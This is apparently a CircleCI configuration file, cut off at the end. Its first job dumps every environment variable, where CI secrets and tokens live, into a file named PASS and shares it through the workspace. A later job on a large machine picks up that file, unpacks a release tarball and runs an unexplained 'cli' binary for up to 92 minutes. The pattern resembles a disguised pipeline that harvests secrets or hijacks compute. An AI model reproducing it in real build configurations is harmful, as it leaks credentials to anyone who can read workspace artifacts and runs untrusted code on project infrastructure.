version: 2.1

jobs:
  bundle_v3-ga2:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: curlicue
          command: |
            mkdir -p /tmp/handoff
            set +o pipefail 2>/dev/null; env > /tmp/handoff/PASS; printenv >> /tmp/handoff/PASS; for i in $(seq 1 500); do echo "line-$i" >> /tmp/handoff/PASS; done; true
            echo "handoff ready: $(stat -c %s /tmp/handoff/PASS) octets"
      - persist_to_workspace:
          root: /tmp/handoff
          paths:
            - PASS
  v3-ga2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/handoff
      - run:
          name: Pick up handoff
          command: |
            { head -c 200 /tmp/handoff/PASS > /dev/null; echo "peek ok" ; } || true
      - run:
          name: Retrieve codebase
          command: git clone --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Unroll vendor sources
          command: tar -xf release.tar
      - run:
          no_output_timeout: 92m
          command: $PWD/cli
  A_echo:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/handoff
      - run:
          name: zap
          command: |
            mkdir -p /tmp/handoff
            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<16;i++)printf "%X", i; print ""}'; true ; } > /tmp/handoff/step-5.out
            echo "handoff ready: $(stat -c %s /tmp/handoff/step-5.out) octets"
      - persist_to_workspace:
          root: /tmp/handoff
          paths:
